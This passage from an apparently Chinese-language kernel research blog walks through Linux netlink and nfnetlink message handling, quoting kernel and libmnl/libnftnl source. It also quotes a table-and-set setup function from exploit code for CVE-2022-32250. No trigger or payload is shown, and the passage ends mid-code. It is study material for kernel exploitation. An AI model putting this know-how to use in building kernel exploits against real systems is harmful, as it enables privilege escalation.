netlink_skb_parms*)&amp;((skb)-&gt;cb))</span></span><br></pre></td></tr></table></figure><p>可以看到这里使用<code>NETLINK_CB</code>宏来操作skb中的扩展cb字段，一共48个字节用于存放netlink的地址和标识相关的内容，并将netlink字段强制定义为了<code>netlink_skb_parms</code>结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_skb_parms</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scm_creds</span>    <span class="title">creds</span>;</span>        <span class="comment">/* Skb credentials    */</span></span><br><span class="line">    __u32            portid;</span><br><span class="line">    __u32            dst_group;</span><br><span class="line">    __u32            flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span>        *<span class="title">sk</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中portid表示原端套接字所绑定的id，dst_group表示消息目的组播地址，flag为标识，sk指向原端套接字的sock结构。</p><p>这里首先将套接字绑定的portid赋值到skb得cb字段中、同时设置组播地址的数量以及netlink_skb标识（这里是已经置位NETLINK_SKB_DST）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">skb_tail_pointer</span><span class="params">(<span class="keyword">const</span> struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> skb-&gt;tail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">memcpy_from_msg</span><span class="params">(<span class="keyword">void</span> *data, struct msghdr *msg, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> copy_from_iter_full(data, len, &amp;msg-&gt;msg_iter) ? <span class="number">0</span> : -EFAULT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来调用最关键的调用memcpy_from_msg拷贝数据，它首先调用skb_put调整skb-&gt;tail指针，然后执行copy_from_iter(data, len, &amp;msg-&gt;msg_iter)将数据从msg-&gt;msg_iter中传输到skb-&gt;data中。</p><p>随后调用<code>security_netlink_send</code>函数进行security检查，最后根据是否组播调用<code>netlink_broadcast</code>或者<code>netlink_unicast</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">netlink_unicast</span><span class="params">(struct sock *ssk, struct sk_buff *skb,</span></span></span><br><span class="line"><span class="params"><span class="function">    u32 portid, <span class="keyword">int</span> nonblock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"><span class="keyword">long</span> timeo;</span><br><span class="line"></span><br><span class="line">skb = netlink_trim(skb, gfp_any());</span><br><span class="line"></span><br><span class="line">timeo = sock_sndtimeo(ssk, nonblock);</span><br><span class="line">retry:</span><br><span class="line">sk = netlink_getsockbyportid(ssk, portid);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(sk)) &#123;</span><br><span class="line">kfree_skb(skb);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(sk);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (netlink_is_kernel(sk))</span><br><span class="line"><span class="keyword">return</span> netlink_unicast_kernel(sk, skb, ssk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sk_filter(sk, skb)) &#123;</span><br><span class="line">err = skb-&gt;len;</span><br><span class="line">kfree_skb(skb);</span><br><span class="line">sock_put(sk);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = netlink_attachskb(sk, skb, &amp;timeo, ssk);</span><br><span class="line"><span class="keyword">if</span> (err == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> netlink_sendskb(sk, skb);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(netlink_unicast);</span><br></pre></td></tr></table></figure><p>首先调用<code>netlink_trim</code>重新裁剪skb的数据区的大小，这可能会clone出一个新的skb结构同时重新分配<code>skb-&gt;data</code>的内存空间，当然如果原本skb中多余的内存数据区非常小或者该内存空间是在vmalloc空间中的就不会执行上述操作，我们现在跟随的情景上下文中就是后一种情况，并不会重新分配空间。</p><p>随后通过<code>sock_sndtimeo</code>函数记下发送超时等待时间，如果已经设置了MSG_DONTWAIT标识，则等待时间为0，否则返回sk-&gt;sk_sndtimeo。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct sock *<span class="title">netlink_getsockbyportid</span><span class="params">(struct sock *ssk, u32 portid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sock</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span>;</span></span><br><span class="line"></span><br><span class="line">sock = netlink_lookup(sock_net(ssk), ssk-&gt;sk_protocol, portid);</span><br><span class="line"><span class="keyword">if</span> (!sock)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ECONNREFUSED);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Don&#x27;t bother queuing skb if kernel socket has no input function */</span></span><br><span class="line">nlk = nlk_sk(sock);</span><br><span class="line"><span class="keyword">if</span> (sock-&gt;sk_state == NETLINK_CONNECTED &amp;&amp;</span><br><span class="line">    nlk-&gt;dst_portid != nlk_sk(ssk)-&gt;portid) &#123;</span><br><span class="line">sock_put(sock);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ECONNREFUSED);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来调用netlink_getsockbyportid根据目的portid号和原端sock结构查找目的端的sock结构。接下来调用<code>netlink_getsockbyportid</code>函数根据目的portid号和原端sock结构查找目的端的sock结构。</p><p>在找到sock结构之后，通过<code>netlink_is_kernel</code>函数判断该sock是否为内核的netlink socket，如果目的地址是内核空间，则调用<code>netlink_unicast_kernel</code>向内核进行单播。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">netlink_unicast_kernel</span><span class="params">(struct sock *sk, struct sk_buff *skb,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct sock *ssk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> =</span> nlk_sk(sk);</span><br><span class="line"></span><br><span class="line">ret = -ECONNREFUSED;</span><br><span class="line"><span class="keyword">if</span> (nlk-&gt;netlink_rcv != <span class="literal">NULL</span>) &#123;</span><br><span class="line">ret = skb-&gt;len;</span><br><span class="line">netlink_skb_set_owner_r(skb, sk);</span><br><span class="line">NETLINK_CB(skb).sk = ssk;</span><br><span class="line">netlink_deliver_tap_kernel(sk, ssk, skb);</span><br><span class="line">nlk-&gt;netlink_rcv(skb);</span><br><span class="line">consume_skb(skb);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">kfree_skb(skb);</span><br><span class="line">&#125;</span><br><span class="line">sock_put(sk);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查目标netlink套接字是否注册了netlink_rcv()接收函数，如果没有则直接丢弃该数据包，否则继续发送流程。</p><p>进入if分支会先对skb设置一些标识，最终调用<code>nlk-&gt;netlink_rcv</code>函数，将消息送到内核中的目的netlink套接字中，经过前面的分析可以知道的是这里最终会调用到<code>nfnetlink_rcv</code>函数中。</p><h3 id="netlink层接收请求流程分析"><a href="#netlink层接收请求流程分析" class="headerlink" title="netlink层接收请求流程分析"></a>netlink层接收请求流程分析</h3><p><strong>下面的流程分析会结合着用户态的动态链接库结合起来分析</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_stable_table_and_set</span><span class="params">(struct mnl_socket* nl, <span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * table_name = name;</span><br><span class="line">    <span class="keyword">char</span> * set_name = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> family = NFPROTO_IPV4;</span><br><span class="line">    <span class="keyword">uint32_t</span> set_id = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// a table for the sets to be associated with</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_table</span> * <span class="title">table</span> =</span> nftnl_table_alloc();</span><br><span class="line">    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);</span><br><span class="line">    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set</span> * <span class="title">set_stable</span> =</span>  nftnl_set_alloc();</span><br><span class="line">    set_name = <span class="string">&quot;set_stable&quot;</span>;</span><br><span class="line">    nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);</span><br><span class="line">    nftnl_set_set_str(set_stable, NFTNL_SET_NAME, set_name);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, <span class="number">1</span>);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_FAMILY, family);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_ID, set_id++);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// expressions</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_expr</span> * <span class="title">exprs</span>[128];</span></span><br><span class="line">    <span class="keyword">int</span> exprid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// serialize</span></span><br><span class="line">    <span class="keyword">char</span> buf[MNL_SOCKET_BUFFER_SIZE*<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> * <span class="title">batch</span> =</span> mnl_nlmsg_batch_start(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> * <span class="title">nlh</span>;</span></span><br><span class="line">    <span class="keyword">int</span> table_seq = seq;</span><br><span class="line"></span><br><span class="line">    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">NFT_MSG_NEWTABLE, family, NLM_F_CREATE|NLM_F_ACK, seq++);</span><br><span class="line">    nftnl_table_nlmsg_build_payload(nlh, table);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// add set_stable</span></span><br><span class="line">    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">                                    NFT_MSG_NEWSET, family,</span><br><span class="line">                                    NLM_F_CREATE|NLM_F_ACK, seq++);</span><br><span class="line">    nftnl_set_nlmsg_build_payload(nlh, set_stable);</span><br><span class="line">    nftnl_set_free(set_stable);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nl == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_open&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] setting stable %s and set\n&quot;</span>, table_name);</span><br><span class="line">    <span class="keyword">if</span> (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),</span><br><span class="line">mnl_nlmsg_batch_size(batch)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_send&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码是 <a href="https://196082.github.io/2023/09/06/CVE-2022-32250/">CVE-2022-32250复现</a> 文章中exp代码中对netlink发送请求时所使用到的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nfnetlink_rcv</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span> =</span> nlmsg_hdr(skb);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (skb-&gt;len &lt; NLMSG_HDRLEN ||</span><br><span class="line">    nlh-&gt;nlmsg_len &lt; NLMSG_HDRLEN ||</span><br><span class="line">    skb-&gt;len &lt; nlh-&gt;nlmsg_len)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!netlink_net_capable(skb, CAP_NET_ADMIN)) &#123;</span><br><span class="line">netlink_ack(skb, nlh, -EPERM, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_type == NFNL_MSG_BATCH_BEGIN)</span><br><span class="line">nfnetlink_rcv_skb_batch(skb, nlh);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">netlink_rcv_skb(skb, nfnetlink_rcv_msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数主要是做上一些检测，在开头检测长度是否合法，随后检测是否具有<code>CAP_NET_ADMIN</code>权限，最后会根据<code>nlh-&gt;nlmsg_type</code>使用不同的函数进行处理。这里简单追踪一下这个<code>nlmsg_type</code>的由来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXPORT_SYMBOL struct mnl_nlmsg_batch *<span class="title">mnl_nlmsg_batch_start</span><span class="params">(<span class="keyword">void</span> *buf,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">size_t</span> limit)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> *<span class="title">b</span>;</span></span><br><span class="line"></span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct mnl_nlmsg_batch));</span><br><span class="line"><span class="keyword">if</span> (b == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">b-&gt;buf = buf;</span><br><span class="line">b-&gt;limit = limit;</span><br><span class="line">b-&gt;buflen = <span class="number">0</span>;</span><br><span class="line">b-&gt;cur = buf;</span><br><span class="line">b-&gt;overflow = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先前面会先通过<code>mnl_nlmsg_batch_start</code>函数申请一个batch。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> &#123;</span></span><br><span class="line"><span class="comment">/* the buffer that is used to store the batch. */</span></span><br><span class="line"><span class="keyword">void</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> limit;</span><br><span class="line"><span class="keyword">size_t</span> buflen;</span><br><span class="line"><span class="comment">/* the current netlink message in the batch. */</span></span><br><span class="line"><span class="keyword">void</span> *cur;</span><br><span class="line"><span class="keyword">bool</span> overflow;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">EXPORT_SYMBOL <span class="keyword">void</span> *<span class="title">mnl_nlmsg_batch_current</span><span class="params">(struct mnl_nlmsg_batch *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> b-&gt;cur;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后通过<code>mnl_nlmsg_batch_current</code>函数返回cur给<code>nftnl_batch_begin</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nftnl_batch_build_hdr</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">uint16_t</span> type, <span class="keyword">uint32_t</span> seq)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfg</span>;</span></span><br><span class="line"></span><br><span class="line">nlh = mnl_nlmsg_put_header(buf);</span><br><span class="line">nlh-&gt;nlmsg_type = type;</span><br><span class="line">nlh-&gt;nlmsg_flags = NLM_F_REQUEST;</span><br><span class="line">nlh-&gt;nlmsg_seq = seq;</span><br><span class="line"></span><br><span class="line">nfg = mnl_nlmsg_put_extra_header(nlh, <span class="keyword">sizeof</span>(*nfg));</span><br><span class="line">nfg-&gt;nfgen_family = AF_UNSPEC;</span><br><span class="line">nfg-&gt;version = NFNETLINK_V0;</span><br><span class="line">nfg-&gt;res_id = NFNL_SUBSYS_NFTABLES;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nftnl_batch_begin</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">uint32_t</span> seq)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">nftnl_batch_build_hdr(buf, NFNL_MSG_BATCH_BEGIN, seq);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是在这里会对nlh赋值为<code>NFNL_MSG_BATCH_BEGIN</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> &#123;</span></span><br><span class="line">__u32nlmsg_len;<span class="comment">/* Length of message including header */</span></span><br><span class="line">__u16nlmsg_type;<span class="comment">/* Message content */</span></span><br><span class="line">__u16nlmsg_flags;<span class="comment">/* Additional flags */</span></span><br><span class="line">__u32nlmsg_seq;<span class="comment">/* Sequence number */</span></span><br><span class="line">__u32nlmsg_pid;<span class="comment">/* Sending process port ID */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里<code>nlmsghdr</code>的定义如上。</p><p>所以根据用户态传入给内核的nlh来看会进入到<code>nfnetlink_rcv_skb_batch</code>函数中进行下一步流程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nfnetlink_rcv_skb_batch</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *nlh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> min_len = nlmsg_total_size(<span class="keyword">sizeof</span>(struct nfgenmsg));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span> =</span> (<span class="keyword">void</span> *)nlh + min_len;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">cda</span>[<span class="title">NFNL_BATCH_MAX</span> + 1];</span></span><br><span class="line"><span class="keyword">int</span> attrlen = nlh-&gt;nlmsg_len - min_len;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfgenmsg</span>;</span></span><br><span class="line"><span class="keyword">int</span> msglen, err;</span><br><span class="line">u32 gen_id = <span class="number">0</span>;</span><br><span class="line">u16 res_id;</span><br><span class="line"></span><br><span class="line">msglen = NLMSG_ALIGN(nlh-&gt;nlmsg_len);</span><br><span class="line"><span class="keyword">if</span> (msglen &gt; skb-&gt;len)</span><br><span class="line">msglen = skb-&gt;len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (skb-&gt;len &lt; NLMSG_HDRLEN + <span class="keyword">sizeof</span>(struct nfgenmsg))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">err = nla_parse_deprecated(cda, NFNL_BATCH_MAX, attr, attrlen,</span><br><span class="line">   nfnl_batch_policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">netlink_ack(skb, nlh, err, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (cda[NFNL_BATCH_GENID])</span><br><span class="line">gen_id = ntohl(nla_get_be32(cda[NFNL_BATCH_GENID]));</span><br><span class="line"></span><br><span class="line">nfgenmsg = nlmsg_data(nlh);</span><br><span class="line">skb_pull(skb, msglen);</span><br><span class="line"><span class="comment">/* Work around old nft using host byte order */</span></span><br><span class="line"><span class="keyword">if</span> (nfgenmsg-&gt;res_id == NFNL_SUBSYS_NFTABLES)</span><br><span class="line">res_id = NFNL_SUBSYS_NFTABLES;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">res_id = ntohs(nfgenmsg-&gt;res_id);</span><br><span class="line"></span><br><span class="line">nfnetlink_rcv_batch(skb, nlh, res_id, gen_id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里前面进行一些预处理，对参数做检验赋值等操作，最后判断<code>nfgenmsg-&gt;res_id</code>的值。这里切换到用户态继续看<code>nfgenmsg</code>结构的由来，不难看到在前面的<code>nftnl_batch_build_hdr</code>函数中就有对这个结构体的使用，并且最终对其的<code>res_id</code>赋值为<code>NFNL_SUBSYS_NFTABLES</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXPORT_SYMBOL struct nlmsghdr *<span class="title">mnl_nlmsg_put_header</span><span class="params">(<span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> len = MNL_ALIGN(<span 